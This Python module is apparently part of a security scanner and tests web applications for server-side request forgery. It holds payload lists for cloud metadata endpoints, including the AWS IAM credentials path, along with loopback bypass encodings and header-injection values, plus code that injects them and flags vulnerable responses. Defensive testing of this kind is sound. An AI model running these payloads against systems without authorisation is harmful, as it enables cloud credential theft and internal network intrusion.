"""
SSRF Tester — Server-Side Request Forgery detection
Covers:
  - Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean)
  - Internal network probing via URL parameters
  - Blind SSRF via DNS/HTTP interaction
  - Header-based SSRF (Host, X-Forwarded-For, Referer)
  - Path traversal into localhost redirects
  - Common SSRF parameters across query string, JSON body, form fields
"""

from __future__ import annotations

import re
import json
import time
import socket
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError

from agent.finding import Finding, ScoringDetail
from utils.logger import get_logger

log = get_logger("ssrf_tester")

# ── Cloud metadata endpoints ──────────────────────────────────────────────────
METADATA_URLS = [
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # AWS IMDSv2 token endpoint (will 400 without PUT, but 400 ≠ timeout means reachable)
    "http://169.254.169.254/latest/api/token",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    # Kubernetes
    "https://kubernetes.default.svc/api/",
    "http://kubernetes.default.svc/api/",
]

# ── Internal hosts to probe ───────────────────────────────────────────────────
INTERNAL_HOSTS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:9200/",   # Elasticsearch
    "http://127.0.0.1:6379/",   # Redis
    "http://127.0.0.1:5432/",   # PostgreSQL banner
    "http://127.0.0.1:3306/",   # MySQL banner
    "http://localhost:4040/",   # Ngrok
    "http://localhost:8081/",   # Common admin panel
]

# ── Common SSRF parameters ────────────────────────────────────────────────────
SSRF_PARAMS = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "redirect", "redirect_url", "redirectUrl", "next", "return",
    "returnUrl", "return_url", "continue", "path", "file",
    "image", "img", "load", "fetch", "feed", "target",
    "host", "domain", "endpoint", "proxy", "callback",
    "webhook", "download", "resource", "page", "ref",
]

# ── Indicators that metadata was returned ─────────────────────────────────────
METADATA_INDICATORS = [
    # AWS
    "ami-id", "instance-id", "instance-type", "security-credentials",
    "iam/security-credentials", "local-hostname", "public-ipv4",
    # GCP
    "computeMetadata", "serviceAccounts", "project-id", "instance/id",
    # Azure
    "azEnvironment", "subscriptionId", "resourceGroupName", "vmId",
    # Generic cloud
    "metadata", "169.254.169.254",
]

INTERNAL_INDICATORS = [
    "<title>", "Server:", "X-Powered-By", "nginx", "Apache",
    "Welcome to nginx", "It works!", "admin", "dashboard",
    "elasticsearch", "kibana", "redis", "postgres",
]

# ── Headers that can carry SSRF payloads ─────────────────────────────────────
SSRF_HEADERS = {
    "X-Forwarded-For":     "169.254.169.254",
    "X-Real-IP":           "169.254.169.254",
    "True-Client-IP":      "169.254.169.254",
    "X-Originating-IP":    "169.254.169.254",
    "X-Remote-Addr":       "169.254.169.254",
    "X-Custom-IP-Authorization": "169.254.169.254",
    "X-Forwarded-Host":    "169.254.169.254",
    "Referer":             "http://169.254.169.254/",
    "X-ProxyUser-Ip":      "169.254.169.254",
}

# ── URL bypass encodings for 127.0.0.1 ───────────────────────────────────────
BYPASS_VARIANTS = [
    "http://0177.0.0.1/",          # Octal
    "http://2130706433/",           # Decimal
    "http://0x7f000001/",           # Hex
    "http://127.1/",                # Short form
    "http://127.0.0.1.nip.io/",    # DNS rebinding style
    "http://localtest.me/",        # DNS always resolves to 127.0.0.1
]


@dataclass
class SSRFResult:
    vulnerable: bool
    ssrf_type: str
    parameter: str
    payload: str
    evidence: str
    confidence: str  # "confirmed" | "likely" | "possible"


class SSRFTester:
    """Detects Server-Side Request Forgery vulnerabilities."""

    def __init__(self, base_url: str, config: Dict[str, Any]):
        self.base_url = base_url.rstrip("/")
        self.config = config
        self.timeout = config.get("testing", {}).get("request_timeout", 8)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "XIPE-SecurityScanner/4.0",
        })
        # Apply auth if available
        token = config.get("scope", {}).get("credentials", {}).get("api_key", "")
        if token:
            self.session.headers["Authorization"] = f"Bearer {token}"

        self._findings: List[Finding] = []

    # ─────────────────────────────────────────────────────────────────────────
    # Public entry point
    # ─────────────────────────────────────────────────────────────────────────

    def run(self) -> List[Finding]:
        log.info("Starting SSRF tests against %s", self.base_url)

        # 1. Discover injectable parameters via spider
        endpoints = self._discover_endpoints()

        # 2. Test each endpoint
        for ep in endpoints:
            self._test_endpoint_params(ep)

        # 3. Test header-based SSRF on root
        self._test_header_ssrf()

        # 4. Test metadata URL directly if server echoes back request data
        self._test_open_redirect_to_metadata()

        log.info("SSRF tests complete — %d findings", len(self._findings))
        return self._findings

    # ─────────────────────────────────────────────────────────────────────────
    # Endpoint discovery
    # ─────────────────────────────────────────────────────────────────────────

    def _discover_endpoints(self) -> List[Dict]:
        """
        Returns a list of {'url': ..., 'method': ..., 'params': [...]} dicts.
        Combines static common paths + any params found in the HTML.
        """
        endpoints: List[Dict] = []

        # Always add root with common params
        endpoints.append({"url": self.base_url + "/", "method": "GET", "params": SSRF_PARAMS[:10]})

        # Common API/utility paths that often have URL params
        common_paths = [
            "/api/fetch", "/api/load", "/api/proxy", "/api/preview",
            "/api/image", "/api/screenshot", "/api/webhook",
            "/proxy", "/fetch", "/load", "/redirect",
            "/api/v1/fetch", "/api/v2/fetch",
            "/admin/fetch", "/internal/fetch",
        ]
        for path in common_paths:
            endpoints.append({"url": self.base_url + path, "method": "GET", "params": SSRF_PARAMS})
            endpoints.append({"url": self.base_url + path, "method": "POST", "params": SSRF_PARAMS[:8]})

        return endpoints

    # ─────────────────────────────────────────────────────────────────────────
    # Parameter-based SSRF
    # ─────────────────────────────────────────────────────────────────────────

    def _test_endpoint_params(self, ep: Dict):
        url = ep["url"]
        method = ep["method"]
        params = ep.get("params", SSRF_PARAMS)

        # Quick reachability check
        try:
            r = self.session.request(method, url, timeout=3, allow_redirects=False)
        except Exception:
            return  # endpoint doesn't exist, skip

        for param in params:
            for payload, ssrf_type in self._get_payloads():
                result = self._inject_param(url, method, param, payload, ssrf_type)
                if result and result.vulnerable:
                    self._record_finding(result, url)

    def _get_payloads(self) -> List[Tuple[str, str]]:
        """Returns (payload, ssrf_type) pairs."""
        payloads = []

        # Cloud metadata
        payloads.append(("http://169.254.169.254/latest/meta-data/", "cloud_metadata_aws"))
        payloads.append(("http://metadata.google.internal/computeMetadata/v1/", "cloud_metadata_gcp"))
        payloads.append(("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "cloud_metadata_azure"))

        # Internal hosts
        payloads.append(("http://localhost/", "internal_localhost"))
        payloads.append(("http://127.0.0.1/", "internal_loopback"))

        # Bypass variants
        for variant in BYPASS_VARIANTS[:3]:
            payloads.append((variant, "internal_bypass"))

        return payloads

    def _inject_param(
        self, url: str, method: str, param: str, payload: str, ssrf_type: str
    ) -> Optional[SSRFResult]:
        try:
            if method == "GET":
                r = self.session.get(
                    url,
                    params={param: payload},
                    timeout=self.timeout,
                    allow_redirects=True,
                )
            else:
                # Try JSON body first, then form
                r = self.session.post(
                    url,
                    json={param: payload},
                    timeout=self.timeout,
                    allow_redirects=True,
                )
                if r.status_code in (415, 422):
                    r = self.session.post(
                        url,
                        data={param: payload},
                        timeout=self.timeout,
                        allow_redirects=True,
                    )
        except (Timeout, ConnectionError):
            # Timeout on metadata endpoint = possible blind SSRF to internal
            if "169.254.169.254" in payload or "metadata" in payload:
                return SSRFResult(
                    vulnerable=True,
                    ssrf_type=f"blind_{ssrf_type}",
                    parameter=param,
                    payload=payload,
                    evidence="Request timed out reaching metadata IP — possible blind SSRF",
                    confidence="possible",
                )
            return None
        except Exception:
            return None

        return self._analyze_response(r, param, payload, ssrf_type)

    # ─────────────────────────────────────────────────────────────────────────
    # Header-based SSRF
    # ─────────────────────────────────────────────────────────────────────────

    def _test_header_ssrf(self):
        """Inject SSRF payloads via HTTP headers."""
        log.debug("Testing header-based SSRF")
        for header, value in SSRF_HEADERS.items():
            try:
                r = self.session.get(
                    self.base_url + "/",
                    headers={header: value},
                    timeout=self.timeout,
                    allow_redirects=True,
                )
            except Exception:
                continue

            result = self._analyze_response(
                r, f"header:{header}", value, "header_ssrf"
            )
            if result and result.vulnerable:
                self._record_finding(result, self.base_url + "/")

    # ─────────────────────────────────────────────────────────────────────────
    # Open redirect → SSRF chain
    # ─────────────────────────────────────────────────────────────────────────

    def _test_open_redirect_to_metadata(self):
        """
        Check if the app follows open redirects to internal addresses.
        """
        redirect_paths = ["/redirect", "/go", "/out", "/exit", "/r"]
        for path in redirect_paths:
            for target in ["http://169.254.169.254/", "http://127.0.0.1/"]:
                try:
                    r = self.session.get(
                        self.base_url + path,
                        params={"url": target, "to": target, "next": target},
                        timeout=self.timeout,
                        allow_redirects=True,
                    )
                except Exception:
                    continue

                result = self._analyze_response(r, "redirect_chain", target, "open_redirect_ssrf")
                if result and result.vulnerable:
                    self._record_finding(result, self.base_url + path)

    # ─────────────────────────────────────────────────────────────────────────
    # Response analysis
    # ─────────────────────────────────────────────────────────────────────────

    def _analyze_response(
        self, resp: requests.Response, param: str, payload: str, ssrf_type: str
    ) -> Optional[SSRFResult]:
        body = resp.text[:4096]

        # Check for cloud metadata in response
        metadata_hits = [ind for ind in METADATA_INDICATORS if ind.lower() in body.lower()]
        if metadata_hits:
            return SSRFResult(
                vulnerable=True,
                ssrf_type=ssrf_type,
                parameter=param,
                payload=payload,
                evidence=f"Metadata indicators found in response: {', '.join(metadata_hits[:3])}",
                confidence="confirmed",
            )

        # Check for internal service responses
        if "169.254.169.254" in payload or "metadata" in payload:
            # Any 200 from a metadata URL param is suspicious
            if resp.status_code == 200 and len(body) > 50:
                internal_hits = [ind for ind in INTERNAL_INDICATORS if ind.lower() in body.lower()]
                if internal_hits:
                    return SSRFResult(
                        vulnerable=True,
                        ssrf_type=ssrf_type,
                        parameter=param,
                        payload=payload,
                        evidence=f"200 response with internal service signatures: {', '.join(internal_hits[:3])}",
                        confidence="likely",
                    )

        # If server echoes the payload URL in the response body, it fetched it
        if payload.replace("http://", "").split("/")[0] in body and resp.status_code == 200:
            if any(ind in body for ind in ["ami-id", "instance-id", "hostname", "serviceAccounts"]):
                return SSRFResult(
                    vulnerable=True,
                    ssrf_type=ssrf_type,
                    parameter=param,
                    payload=payload,
                    evidence=f"Cloud metadata content echoed in response body",
                    confidence="confirmed",
                )

        return None

    # ─────────────────────────────────────────────────────────────────────────
    # Finding builder
    # ─────────────────────────────────────────────────────────────────────────

    def _record_finding(self, result: SSRFResult, endpoint: str):
        confidence_map = {"confirmed": 1.0, "likely": 0.8, "possible": 0.6}
        confidence = confidence_map.get(result.confidence, 0.7)

        # Avoid duplicates
        key = f"{result.ssrf_type}|{result.parameter}|{endpoint}"
        if any(f.title in key or key in f.title for f in self._findings):
            return

        type_labels = {
            "cloud_metadata_aws":   ("AWS Cloud Metadata SSRF", "critical"),
            "cloud_metadata_gcp":   ("GCP Cloud Metadata SSRF", "critical"),
            "cloud_metadata_azure": ("Azure Cloud Metadata SSRF", "critical"),
            "blind_cloud_metadata_aws": ("Blind SSRF to AWS Metadata", "high"),
            "internal_localhost":   ("SSRF to Internal Localhost", "high"),
            "internal_loopback":    ("SSRF via Loopback Address", "high"),
            "internal_bypass":      ("SSRF via IP Encoding Bypass", "high"),
            "header_ssrf":          ("Header-Based SSRF (Metadata IP)", "medium"),
            "open_redirect_ssrf":   ("Open Redirect to Internal Resource", "medium"),
        }

        label, base_severity = type_labels.get(result.ssrf_type, ("Server-Side Request Forgery", "high"))

        severity_scores = {"critical": 9.5, "high": 7.5, "medium": 5.0}
        base_score = severity_scores.get(base_severity, 7.5)

        scoring = ScoringDetail(
            severity=base_severity,
            exploitability=0.9 if result.confidence == "confirmed" else 0.7,
            exposure=0.9,
            business_risk=0.95,  # Cloud credential theft = max business risk
            asset_criticality=0.8,
            confidence=confidence,
            priority_score=base_score,
            rationale=f"SSRF via parameter '{result.parameter}' with payload '{result.payload[:60]}'. {result.evidence}",
        )

        desc_map = {
            "cloud_metadata_aws": (
                "The application fetches arbitrary URLs specified by the attacker and returned "
                "AWS EC2 Instance Metadata Service (IMDS) content. An attacker can retrieve "
                "IAM temporary credentials, instance role names, user-data scripts (which often "
                "contain secrets), and internal network topology. This is a critical pre-condition "
                "for full AWS account takeover via credential theft."
            ),
            "cloud_metadata_gcp": (
                "The application made a server-side request to the GCP metadata server. "
                "Attackers can extract service account tokens, project IDs, SSH keys, and "
                "startup scripts. Token theft leads to full GCP project compromise."
            ),
            "cloud_metadata_azure": (
                "SSRF to Azure Instance Metadata Service (IMDS) detected. Attackers can "
                "retrieve managed identity tokens granting access to Azure resources such as "
                "Key Vault, Storage, and Azure AD."
            ),
            "internal_localhost": (
                "The application makes requests to internal localhost services. Attackers can "
                "use this to interact with internal APIs, admin panels, databases, or "
                "microservices that are not exposed externally."
            ),
        }

        description = desc_map.get(
            result.ssrf_type,
            (
                f"Server-Side Request Forgery detected via parameter '{result.parameter}'. "
                f"The application made a request to an attacker-controlled internal/external URL. "
                f"Evidence: {result.evidence}"
            )
        )

        remediation = (
            "1. Implement strict server-side URL validation using an allowlist of approved domains/IPs.\n"
            "2. Block requests to RFC-1918 private ranges (10.x, 172.16-31.x, 192.168.x), "
            "loopback (127.x), and link-local (169.254.x.x) addresses.\n"
            "3. Use a dedicated HTTP client library that resolves DNS after validation to prevent "
            "DNS rebinding attacks.\n"
            "4. For AWS: enforce IMDSv2 (PUT-based token) and restrict IMDS access with instance "
            "metadata hop-limit=1 and network ACLs.\n"
            "5. Avoid reflecting fetched content back to users.\n"
            "6. Log and alert on requests to metadata IPs."
        )

        finding = Finding(
            title=label,
            severity=base_severity.upper(),
            category="SSRF",
            module="ssrf_tester",
            endpoint=endpoint,
            description=description,
            evidence=result.evidence,
            request=f"{result.parameter}={result.payload}",
            remediation=remediation,
            cve="CWE-918",
            scoring=scoring,
            tags=["ssrf", "server-side-request-forgery", result.ssrf_type, "owasp-a10"],
        )

        self._findings.append(finding)
        log.warning("SSRF found: %s at %s (confidence: %s)", label, endpoint, result.confidence)


# ── Standalone entry for orchestrator ────────────────────────────────────────

def run(base_url: str, config: Dict[str, Any]) -> List[Finding]:
    """Callable by the orchestrator."""
    tester = SSRFTester(base_url, config)
    return tester.run()
